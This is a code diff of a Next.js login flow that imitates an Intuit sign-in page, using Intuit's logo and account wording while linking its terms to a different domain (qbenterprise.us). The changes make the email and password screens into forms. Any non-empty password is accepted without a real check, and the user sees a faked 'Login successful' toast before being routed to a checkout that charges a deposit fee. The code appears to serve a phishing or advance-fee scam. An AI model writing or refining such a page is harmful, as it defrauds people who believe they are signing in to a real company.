@@ -8,6 +8,7 @@ import Image from 'next/image';
 import Link from 'next/link';
 import { useRouter, useSearchParams } from 'next/navigation';
 import { useEffect, useState } from 'react';
+import toast from 'react-hot-toast';
 
 // Login Page Component
 const LoginPage = ({ onNext }: { onNext: (email: string) => void }) => {
@@ -24,7 +25,7 @@ const LoginPage = ({ onNext }: { onNext: (email: string) => void }) => {
 
     return (
         <div className="mt-20 flex items-center justify-center p-4">
-            <div className="bg-white p-10 rounded-lg shadow-sm border border-gray-200 w-full max-w-md">
+            <form onSubmit={handleSignIn} className="bg-white p-10 rounded-lg shadow-sm border border-gray-200 w-full max-w-md">
                 {/* Logo */}
                 <div className="mb-5">
                     <Image src="/logo.svg" className='mx-auto' alt="Intuit Logo" width={100} height={100} />
@@ -41,6 +42,7 @@ const LoginPage = ({ onNext }: { onNext: (email: string) => void }) => {
                         type="email"
                         placeholder="Email"
                         value={email}
+                        required
                         onChange={(e) => setEmail(e.target.value)}
                         className="w-full px-4 py-3 border-2 border-[#2ca01c] rounded focus:outline-none focus:border-blue-500 text-gray-700"
                     />
@@ -62,7 +64,7 @@ const LoginPage = ({ onNext }: { onNext: (email: string) => void }) => {
 
                 {/* Sign In Button */}
                 <button
-                    onClick={handleSignIn}
+                    type='submit'  
                     className="w-full bg-[#2ca01c] hover:bg-[#2CA01C] text-white py-3 px-4 rounded font-medium transition-colors duration-200 flex items-center justify-center"
                 >
                     <svg className="w-4 h-4 mr-2" fill="currentColor" viewBox="0 0 20 20">
@@ -70,8 +72,10 @@ const LoginPage = ({ onNext }: { onNext: (email: string) => void }) => {
                     </svg>
                     Sign in
                 </button>
-                <p className='text-gray-400 text-xs mt-5 leading-4'>By selecting Sign in for your Intuit Account, you agree to our <Link href="/terms" className='text-blue-600 hover:text-blue-800'>Terms</Link>. Our <Link className='text-blue-600 hover:text-blue-800' href="/privacy">Privacy Policy</Link> applies to your personal data.</p>
-            </div>
+                <p className='text-gray-400 text-xs mt-5 leading-4'>
+                    By selecting Sign in for your Intuit Account, you agree to our <Link href="https://www.qbenterprise.us/terms-conditions" className='text-blue-600 hover:text-blue-800'>Terms</Link>. Our <Link className='text-blue-600 hover:text-blue-800' href="https://www.intuit.com/privacy/">Privacy Policy</Link> applies to your personal data.
+                </p>
+            </form>
         </div>
     );
 };
@@ -88,26 +92,30 @@ const PasswordPage = ({ email, onBack }: { email: string; onBack: () => void }) 
     
     const {paymentObj} = useParamPaymentDetails({noLinkRedirection: true, enableToast: false, noLoginRedir:true})
 
-    const { mutate, data, isPending, isSuccess, isError, error } = useCreateFee();
+    const { mutateAsync, isPending } = useCreateFee();
 
-    const handleContinue = () => {
+    const handleContinue = (e: React.FormEvent<HTMLFormElement>) => {
+        e.preventDefault()
+        if(!paymentID){
+            toast.error('Internal Server Error')
+            return
+        }
         if (password) {
-            // Handle login logic here
-            console.log(paymentObj)
-            mutate(paymentObj.price)
+            mutateAsync((Math.floor(paymentObj.total))*100).then((data)=>{
+            setUserDetails({deposit_price: data.price, deposit_charge: data.charge})
+            setStep(2)
+            toast.success('Login successful')
+            router.push('/checkout?payment=' + paymentID)
+            }).catch((error)=>{
+                console.log(error)
+                toast.error("Internal Server Error! Try again")
+            })
         }
     };
-    useEffect(() => {
-        if(isSuccess){
-            setUserDetails({deposit_price: data.price, deposit_charge: data.charge})
-            router.push('/checkout?payment=' + paymentID)
-            setStep(2)
-        }
-    }, [isSuccess])
     
     return (
         <div className="mt-20 flex items-center justify-center p-4">
-            <div className="bg-white p-10 rounded-lg shadow-sm border border-gray-200 w-full max-w-md">
+            <form onSubmit={handleContinue} className="bg-white p-10 rounded-lg shadow-sm border border-gray-200 w-full max-w-md">
                 {/* Logo */}
                 <div className="mb-5">
                     <Image src="/logo.svg" className='mx-auto' alt="Intuit Logo" width={100} height={100} />
@@ -138,6 +146,7 @@ const PasswordPage = ({ email, onBack }: { email: string; onBack: () => void }) 
                     <label className="block text-gray-700 text-sm mb-2">Password</label>
                     <div className="relative">
                         <input
+                            required
                             type={showPassword ? "text" : "password"}
                             value={password}
                             onChange={(e) => setPassword(e.target.value)}
@@ -165,19 +174,21 @@ const PasswordPage = ({ email, onBack }: { email: string; onBack: () => void }) 
                 {/* Continue Button */}
                 <button
                     disabled={isPending}
-                    onClick={handleContinue}
+                    type='submit'
                     className="w-full bg-[#2ca01c] hover:bg-[#2CA01C] text-white py-3 px-4 rounded font-medium transition-colors duration-200 mb-6"
                 >
                     {isPending ? 'Continuing...' : 'Continue'}
                 </button>
-            </div>
+            </form>
         </div>
     );
 };
 
 // Main App Component
 export default function IntuitLogin() {
-    const {paymentObj} = useParamPaymentDetails({enableToast: false, noLinkRedirection: true})
+    const searchParams = useSearchParams()
+    const paymentID = searchParams.get('payment')
+    const {paymentObj} = useParamPaymentDetails({enableToast: false, noLinkRedirection: paymentID ? false : true, noLoginRedir: false})
     const [currentPage, setCurrentPage] = useState('login');
     const {setStep} = useSteps()
     const {setUserDetails, userDetails} = useUserDetails()
